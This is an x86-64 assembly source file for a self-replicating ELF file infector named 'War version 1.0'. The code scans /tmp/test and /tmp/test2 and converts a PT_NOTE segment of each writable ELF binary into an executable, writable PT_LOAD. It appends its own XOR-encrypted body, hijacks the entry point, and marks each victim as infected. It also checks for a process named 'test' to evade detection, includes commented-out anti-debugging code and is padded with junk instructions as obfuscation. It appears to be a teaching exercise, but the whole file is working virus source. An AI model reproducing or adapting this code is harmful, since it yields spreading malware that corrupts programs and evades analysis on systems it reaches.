%define SYS_READ			0
%define SYS_WRITE			1
%define SYS_OPEN 			2
%define SYS_CLOSE			3
%define SYS_STAT			4
%define SYS_FSTAT			5
%define SYS_LSEEK			8
%define SYS_MPROTECT		10
%define SYS_PREAD64			17
%define SYS_PWRITE64		18
%define SYS_EXIT			60
%define SYS_CHDIR			80
%define SYS_PTRACE			101
%define SYS_GETUID			107
%define SYS_GETGID			108
%define SYS_SYNC			162
%define SYS_GETDENTS64		217
%define SYS_CLOCK_GETTIME	228

%define S_IFDIR		0x4000
%define S_IFMT		0xf000
%define O_RDONLY	00
%define SEEK_END	2

%define WAR_STACK_SIZE 5000
%define DIRENT_BUFFSIZE	1024
%define ASM_JUMP_INSTR	0xe9
%define EHDR_SIZE 64
%define PHDR_SIZE 56
%define PT_NOTE	4
%define PT_LOAD 1
%define PF_X 1
%define PF_W 2
%define PF_R 4

%define CLOCK_REALTIME 0

%define	S_IRUSR 256
%define S_IWUSR 128

%define PTRACE_TRACEME 0
%define SELF_PID 0

%define DT_DIR 4

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;             STACK            ;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

; r15 /tmp/test                                     directory /tmp/test name
; r15 + 16 /tmp/test                                directory /tmp/test fd

; r15 + 32 struct stat                              
;	r15 + 32 dev inode_number
;	r15 + 56 stat.st_mode
; 	r15 + 80 stat.st_size

; r15 + 176 struct dirent (sizeof dirent 280)
;	r15 + 176    d_ino       	                    64-bit Inode number.
;	r15 + 184    d_off       	                    64-bit Offset to the next dirent structure.
;	r15 + 192    d_reclen    	                    16-bit Length of this record.
;	r15 + 194    d_type      	                    8-bit File type (DT_REG, DT_DIR, etc.).
;	r15 + 195    d_name      	                    Null-terminated filename.

; r15 + 1300 Ehdr64
; 	🦓 r15 + 1300 = ehdr
; 	🐴 r15 + 1304 = ehdr.class                      ELF class.
; 	🦄 r15 + 1308 = ehdr.pad                        Unused padding for alignment.
;			r15 + 1309 ->> encryption key
; 	🦓 r15 + 1324 = ehdr.entry                      Entry point virtual address.
; 	🐴 r15 + 1332 = ehdr.phoff                      Offset of the program header table.
; 	🦄 r15 + 1354 = ehdr.phentsize                  Size of each program header entry.
; 	🦓 r15 + 1356 = ehdr.phnum                      Number of program header entries.
; 	🐴 r15 + 1364 = phdr.type                       Type of segment (e.g., PT_LOAD, PT_DYNAMIC).
; 	🦄 r15 + 1368 = phdr.flags                      Segment flags (e.g., PF_X, PF_W, PF_R).
; 	🦓 r15 + 1372 = phdr.offset                     Offset of the segment in the file.
; 	🐴 r15 + 1380 = phdr.vaddr                      Virtual address of the segment in memory.
; 	🦄 r15 + 1388 = phdr.paddr                      Physical address of the segment (not used on most systems).
; 	🦓 r15 + 1396 = phdr.filesz                     Size of the segment in the file.
; 	🐴 r15 + 1404 = phdr.memsz                      Size of the segment in memory (may include padding).
; 	🦄 r15 + 1412 = phdr.align                      Alignment of the segment in memory and file

; r15 + 1420 target binary_fd                       Actual reading file descriptor

; r15 + 1424 Phdr64
;	r15 + 1424    phdr.p_type                       Type of segment (e.g., PT_LOAD, PT_DYNAMIC).
;	r15 + 1428    phdr.p_flags                      Segment flags (e.g., PF_X, PF_W, PF_R).
;	r15 + 1432    phdr.p_offset                     Offset of the segment in the file.
;	r15 + 1440    phdr.p_vaddr                      Virtual address of the segment in memory.
;	r15 + 1448    phdr.p_paddr                      Physical address of the segment (not used on most systems).
;	r15 + 1456    phdr.p_filesz                     Size of the segment in the file.
;	r15 + 1464    phdr.p_memsz                      Size of the segment in memory (may include padding).
;	r15 + 1472    phdr.p_align                      Alignment of the segment in memory and file.

; r15 + 1484                                        phdr_num counter to iterate over the headers
; r15 + 1492										original phdr offset
; r15 + 1500                                        binary to infect size

; r15 + 1508                                        entry dpuente
; r15 + 1516	(5 bytes)							jmp instruction

; r15 + 1524	; self fd
; r15 + 1530	; is_encrypted buffer
; r15 + 1538	; encryption buffer (1byte)
; r15 + 1550	; 16 bytes							sys_clock_gettime structure
global _start

section .text write exec
_start:
	mov r9, [rsp + 8]							; save program name
	push rdx
	push rsp
	sub  rsp, WAR_STACK_SIZE                    ; Reserve some space in the register r15 to store all the data needed by the program
	mov r15, rsp

; _ptrace_anti_debug:
; 	mov rdi, PTRACE_TRACEME
; 	mov rsi, SELF_PID
; 	lea rdx, 1
; 	mov r10, 0
; 	mov rax, SYS_PTRACE
; 	syscall

; 	cmp rax, 0
; 	jl _end

; 	mov rax, SYS_GETGID
; 	syscall

_is_encrypted:
	lea rdi, [r9]
	mov rsi, O_RDONLY
	mov rax, SYS_OPEN
	syscall
	mov [r15 + 1524], rax

	; pread (fd, buff, len, off)
	mov rdi, [r15 + 1524]
	lea rsi,[ r15 + 1530]
	mov rdx, 1
	mov r10, 8
	mov rax, SYS_PREAD64
	syscall
	mov rdi, [r15 + 1524]
	mov rax, SYS_CLOSE
	syscall
	cmp byte [r15 + 1530], 'I'
	jne _payload
	
_decypher:
	mov r8, 0
	mov rdx, war - _payload
	xor r9, r9
	call .get_rip
	.get_rip:
		pop rbp
		sub rbp, .get_rip

	.loop:
		lea r10, [rbp + _payload]
		xor byte [r10 + r8], 42
		inc r8
		cmp r8, rdx
		jl .loop

_payload:

_evade_specific_process:								; cd to /proc
	mov qword [r15], '/pro'
	mov qword [r15 + 4], 'c'
	lea rdi, [r15]
	mov rax, SYS_GETUID
	syscall
	mov rax, SYS_CHDIR
	syscall

	cmp rax, 0
	jne _end

	_open_proc:
		mov rdi, r15
		mov rsi, O_RDONLY
		mov rax, SYS_OPEN
		syscall

		test rax, rax									; checking open
		js _end

		mov [r15 + 16], rax								; saving /tmp/test open fd

	_iterate_over_proc:									; getdents the /proc dir to iterate over all the process folders
		mov rdi, [r15 + 16]
		lea rsi, [r15 + 176]
		mov rdx, DIRENT_BUFFSIZE
		mov rax, SYS_GETDENTS64
		syscall
		cmp rax, 0										; no more files in the directory to read
		je _close_proc

		xor r14, r14									; i = 0 for the first iteration
		mov r13, rax									; r13 stores the number of read bytes with getdents
		_proc_loop:
			movzx r12d, word [r15 + 192 + r14]

			_check_if_process_is_dir:
				cmp byte [r15 + 194 + r14], DT_DIR
				jne _continue_proc_loop

				mov rax, SYS_GETUID
				syscall

			lea r9, [r15 + 195 + r14]
			_check_if_process_is_num:
				cmp byte [r9], 0
				je _pid_folder
				cmp byte [r9], 48
				jl _continue_proc_loop
				cmp byte [r9], 57
				jg _continue_proc_loop
				inc r9
				jmp _check_if_process_is_num

			mov rax, SYS_GETGID
			syscall
				
			_pid_folder:
				lea rdi, [r15 + 195 + r14]
				mov rax, SYS_CHDIR
				syscall

			_read_comm:
				mov qword [rdi], 'comm'
				mov rsi, O_RDONLY
				mov rax, SYS_OPEN
				syscall
	
				mov r9, rax
				mov rdi, rax
				mov rax, SYS_GETUID
				syscall
				lea rsi, [r15 + 1532]
				mov rdx, 16
				mov rax, SYS_READ
				syscall

				cmp rax, 5
				jne _close_process_comm

				mov rax, SYS_GETUID
				syscall

				cmp dword [r15 + 1532], "test"
				jne _close_process_comm
				_close_and_quit:
					mov rdi, r9
					nop
					mov rax, SYS_CLOSE
					nop
					syscall
					nop
					jmp _end
					nop

					mov rax, SYS_GETGID
					nop
					syscall
		
			_close_process_comm:
				mov rdi, r9
				nop
				mov rax, SYS_CLOSE
				nop
				syscall
				nop

				mov rax, SYS_GETGID
				syscall

			_return_proc:
				lea rdi, [r15]
				mov rax, SYS_CHDIR
				syscall

				mov rax, SYS_GETGID
				syscall

		_continue_proc_loop:
			add r14, r12
			cmp r14, r13
			jl _proc_loop                           ; if it has still files to read continues to the next one
			jmp _iterate_over_proc

	_close_proc:
		mov rdi, [r15 + 16]
		mov rax, SYS_CLOSE
		syscall

		mov rax, SYS_GETGID
		syscall

	_infinite_loop:
		jmp _folder_to_infect
		mov rax, SYS_GETGID
		syscall
		jmp  _infinite_loop

_folder_to_infect:	
	mov qword [r15], '/tmp'
	mov qword [r15 + 4], '/tes'
	mov qword [r15 + 8], 't/'                ; assigning /tmp/test to the beginning of the r15 register

_useless:
	nop
	xor rax, rax
	nop

_folder_stat:
	mov rdi, r15
	xor rdi, 0xfe45
	lea rsi, [r15 + 32]
	mov rax, SYS_STAT
	xor rdi, 0xfe45
	syscall

	cmp rax, 0
	jne _tmp_test2

_is_dir:
	lea rax, [r15 + 56]
	nop
	mov rcx, [rax]
	nop
	mov rdx, S_IFDIR
	nop
	and rcx, S_IFMT
	nop
	cmp rdx, rcx
	nop
	jne _end
	nop

_write_an_important_message:
	mov rax, SYS_WRITE
	mov rdi, 1
	lea rsi, [r15]
	mov rdx, 0
	syscall

_diropen:
	mov rdi, 0
	nop
	add rdi, rdi
	nop
	mov rdi, r15
	xor rdi, 0xaf34
	nop
	mov rsi, O_RDONLY
	nop
	mov rax, SYS_OPEN
	nop
	xor rdi, 0xaf34
	syscall

	test rax, rax                                  ; checking open
	js _tmp_test2

	mov [r15 + 16], rax                            ; saving /tmp/test open fd

_change_to_dir:                                    ; cd to dir
	lea rdi, [r15]
	mov rax, SYS_CHDIR
	syscall

	lea rdi, [r15]
	mov rax, SYS_CHDIR
	syscall

	lea rdi, [r15]
	mov rax, SYS_CHDIR
	syscall

	lea rdi, [r15]
	mov rax, SYS_CHDIR
	syscall

	lea rdi, [r15]
	mov rax, SYS_CHDIR
	syscall

	cmp rax, 0
	jne _tmp_test2

_dirent_tmp_test:                                  ; getdents the directory to iterate over all the binaries
	mov rdi, [r15 + 16]
	nop
	lea rsi, [r15 + 176]
	nop
	mov rdx, DIRENT_BUFFSIZE
	nop
	mov rax, SYS_GETDENTS64
	nop
	syscall

	imul rax, rax, 1
	cmp rax, 0                                     ; no more files in the directory to read
	je _close_folder

	xor r14, r14                                   ; i = 0 for the first iteration
	mov r13, rax                                   ; r13 stores the number of read bytes with getdents

	mov rdi, rsi
	mov rax, r10
	inc rax
	imul rdi, rdi, 2

	lea rdi, [r15]
	mov rax, SYS_CHDIR
	syscall

	imul rax, rax, 1
	_dirent_loop:
		movzx r12d, word [r15 + 192 + r14]
		inc r14

	_stat_file:
		dec r14
		lea rdi, [r15 + 195 + r14]                 ; stat over every file
		lea rsi, [r15 + 32]
		mov rax, SYS_STAT
		syscall

		imul rax, rax, 1
		
		cmp rax, 0
		jne _continue_dirent
		add r14, [r15]

	_check_file_flags:                             ; check if if the program can read and write over the binary
		lea rax, [r15 + 56]
		mov rcx, [rax]
		and rcx, S_IRUSR                           ; rcx & S_IRUSR == 1
		test rcx, rcx
		jz _continue_dirent

		imul rax, rax, 1

		lea rax, [r15 + 56]  
		mov rcx, [rax]
		and rcx, S_IWUSR                           ; rcx & S_IWUSR == 1
		test rcx, rcx
		jz _continue_dirent

		imul rax, rax, 1

		sub r14, [r15]
		nop
		lea rax, [r15 + 56]
		nop
		mov rcx, [rax]
		nop
		mov rdx, S_IFDIR
		nop
		and rcx, S_IFMT
		nop
		imul rax, rax, 1
		nop
		cmp rdx, rcx
		nop
		je _continue_dirent                        ; checks if its a directory, if so, jump to the next binary of the dirent

		cmp dword [r15 + 80], 64                   ; checks that the file is at least as big as an ELF header
		jl _continue_dirent

	xor rdi, rdi
	_important_loop:
		inc rdi
		mov rsi, 0xaf01
		inc rdi
		xor rax, rax
		imul rax, rax, 1
		dec rdi
		add rdi, 4
		nop
		cmp rdi, 0x001001
		jl _important_loop

		imul rax, rax, 1

	_open_bin:
		lea rdi, [r15 + 195 + r14]
		xor rdi, 0x0101
		mov rsi, 424241
		nop
		xor rax, rax
		mov rsi, 0x0002                            ; O_RDWR 
		mov rdx, 0644o
		xor rdi, 0x0101
		mov rax, SYS_OPEN                          ; open ( dirent->d_name, O_RDWR )
		syscall

		cmp rax, 0
		jl _continue_dirent
		imul rax, rax, 1

		mov qword [r15 + 1420], rax                ; save binary fd
		nop
		mov rdi, rax                               ; rax contains fd
		nop
		lea rsi, [r15 + 1300]                      ; rsi = ehdr
		nop
		mov rdx, EHDR_SIZE			               ; ehdr.size
		nop
		xor r10, r10                               ; read at offset 0
		nop
		mov rax, SYS_PREAD64
		nop
		syscall

		mov r9, rsi
		add r9, 5
		imul r9, r9, 2

	_is_elf:
		cmp dword [r15 + 1300], 0x464c457f         ; check if the file starts with 177ELF what indicates it is an ELF binary
		jne _close_bin
		imul rax, rax, 1

	_is_infected:
		cmp dword [r15 + 1308], 0x00000049         ; check if bichooo!! ssuuuuu
		je _close_bin

	_save_entry_dpuente:
		mov r9, [r15 + 1324]
		mov [r15 + 1508], r9
		imul rax, rax, 1

		mov qword [r15 + 1484], 0             ; i = 0, iterate over all ELF program headers
		_read_phdr:
			mov word r9w, [r15 + 1484]
			cmp word [r15 + 1356], r9w
			je _close_bin                          ; check if all the headers have been read

			lea rsi, [r15 + 1424]
			nop
			mov rdx, PHDR_SIZE
			nop
			mov r10, [r15 + 1484]
			nop
			imul r10, r10, PHDR_SIZE
			nop
			add r10, EHDR_SIZE
			nop

			imul rax, rax, 1

			mov qword [r15 + 1492], r10           ; saving phdr offset
			mov rdi, [r15 + 1420]
			mov rax, SYS_PREAD64
			syscall

			cmp word [r15 + 1424], PT_NOTE         ; phdr->type
			jne _next_phdr                         ; if it is not a PT_NOTE header, continue to check the next one

			imul rax, rax, 1

		_change_ptnote_to_ptload:
			mov dword [r15 + 1424], PT_LOAD        ; change PT_NOTE header to PT_LOAD

		_change_mem_protections:
			mov dword [r15 + 1428], PF_R | PF_X | PF_W   ; disable memory protections
			imul rax, rax, 1

		_adjust_mem_vaddr:
		 	mov r9, [r15 + 80]					   ; copy stat.st_size to aux registry
			mov rax, r9
			mov rdi, rax
			mov rsi, rdi
			mov r9, rsi
		 	add r9, 0xc000000					   ; add enough memory to account for the new malicious code
		 	mov [r15 + 1440], r9				   ; patch phdr.vaddr

			imul rax, rax, 1

		_patch_segment_size:                       ; adding the length of the program to the section size as well as to section memory
			add qword [r15 + 1456], _stop - _start + 5
			add qword [r15 + 1464], _stop - _start + 5
			mov qword [r15 + 1472], 0x200000       ; patch phdr.align to 2MB

			imul rax, rax, 1

			mov rax, SYS_SYNC
			syscall

		_another_important_loop:
			inc rdi
			mov rsi, 0xaf01
			inc rdi
			xor rax, rax
			imul rax, rax, 2
			dec rdi
			add rdi, 2
			nop
			cmp rdi, 0x001010
			jl _another_important_loop

		imul rax, rax, 1

		_point_offset_to_converted_segment:
			mov rdi, SYS_LSEEK
			mov rax, rdi
			mov rdi, [r15 + 1420]
			xor rdi, 0x01cd
			mov rsi, 0
			mov rdx, SEEK_END
			xor rdi, 0x01cd
			syscall

			cmp rax, 0
			jle _close_bin
 
			mov [r15 + 1432], rax                  ; PT_LOAD starts at the end of the target bin to execute our code

			call .delta
			.delta:
				pop rbp
				sub rbp, .delta

		_append_virus:
			_get_timestamp:
				lea rsi, [r15 + 1550]
				mov rdi, CLOCK_REALTIME
				mov rax, SYS_CLOCK_GETTIME
				syscall

			xor r8, r8 ; i = 0
			mov r9, _stop - _start ; virus length
			mov rdi, [r15 + 1420]  ; fd

			.loop:
				lea rsi, [rbp + _start + r8]
				mov rdx, 1
				cmp r8, _payload - _start
				jl .nocypher

				.cypher:
					cmp r8, war - _start
					jge .nocypher
					xor r10,r10
					mov r10b, byte [rsi]
					xor r10b, 42
					mov byte [r15 + 1538], r10b
					lea rsi, [r15 + 1538]

				.nocypher:
					cmp r8, _timestamp - _start
					jl .end
					.build_timestamp:
						cmp r8, _close_folder - _start - 1
						jg .end
						mov r10, r8
						sub r10, _timestamp - _start
						shr r10, 1  ;/ 2
						mov r10b, byte [r15 + 1550 + r10]
						test r8, 1 ; is_odd
						jnz .lower_part
						; if is_even
						shr r10b, 4 ; / 16
						jmp .write_letter_to_signature
						;else
						.lower_part:
							mov al, r10b
							and al, 16
							mov r10b, al
						.write_letter_to_signature:
						cmp r10b, 0x9
						jg .convert_letters
						add byte r10b, '0'
						jmp .end_conversion
						.convert_letters:
							sub r10b, 10
							add byte r10b, 'A'
						.end_conversion:
						mov byte [r15 + 1538], r10b
						lea rsi, [r15 + 1538]
						
				.end:
					
				mov rax, SYS_WRITE
				syscall
				inc r8
				cmp r8, r9
				jl .loop
			mov rax, SYS_SYNC
			syscall

		_rewrite_phdr:								; writes new header modifications to the binary
			mov rdi, [r15 + 1420]
			xor rdi, 0x0101
			lea rsi, [r15 + 1424]
			mov rax, rsi
			mov rdx, PHDR_SIZE
			mov rsi, rax
			imul rax, rax, 1
			mov qword r10, [r15 + 1492]				; offset to the phdr
			mov rax, SYS_PWRITE64
			xor rdi, 0x0101
			syscall

			mov rax, SYS_SYNC
			syscall

		_rewrite_ehdr:
			mov qword r9, [r15 + 1440]
			mov qword [r15 + 1324], r9

			mov byte [r15 + 1308], 'I'				; sign as infected

			mov rdi, [r15 + 1420]
			mov rax, rdi
			lea rsi, [r15 + 1300]
			imul rax, rax, 1
			mov rdx, EHDR_SIZE
			mov r10, 0
			mov rdi, rax
			mov rax, SYS_PWRITE64
			syscall

			mov rax, SYS_SYNC
			syscall

		_patch_jmp:
			mov rax, SYS_LSEEK
			mov rdi, [r15 + 1420]
			xor rdi, 0xabcd
			mov rsi, 0
			mov rdx, SEEK_END
			xor rdi, 0xabcd
			syscall

			cmp rax, 0
			jle _close_bin

			mov rdx, [r15 + 1440]
			add rdx, 5								; JMP + 0xNNNNNNNN (5 bytes)
			sub [r15 + 1508], rdx
			sub dword [r15 + 1508], _stop - _start
			mov byte [r15 + 1516], 0xe9
			mov r9, [r15 + 1508]
			mov [r15 + 1517], r9
		_generate_encryption_key:
			

		_write_patched_jump:
			mov rdi, [r15 + 1420]
			lea rsi, [r15 + 1516]
			mov rdx, 5
			mov r10, rax
			mov rax, SYS_PWRITE64
			syscall

			mov rax, SYS_SYNC
			syscall

			jmp _close_bin

		_next_phdr:
			inc word [r15 + 1484]
			jmp _read_phdr

	_close_bin:
		mov qword rdi, [r15 + 1420]
		mov rax, SYS_CLOSE
		syscall

	_continue_dirent:
		add r14, r12
		cmp r14, r13
		jne _dirent_loop								; if it has still files to read continues to the next one
		jmp _dirent_tmp_test							; else, do the getdents again

		mov rax, SYS_SYNC
		syscall


war:
	db 0,'War version 1.0 (c)oded by Core Contributor darodrig-rcabezas, Lord Commander of the Night', 0x27 ,'s Watch - '
_timestamp:
	db 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49, 0x00				; 11111111
	
_close_folder:
	mov rdi, [r15 + 16]
	mov rax, SYS_CLOSE
	syscall

_tmp_test2:
	mov r9, [r15 + 8]
	cmp r9w, 0x2f74
	jne _end
	mov byte [r15 + 9], '2'
	jmp _folder_stat

_end:
	add rsp, WAR_STACK_SIZE
	pop rsp
	pop rdx

_stop:
	mov rax, SYS_EXIT
	xor rdi, rdi
	syscall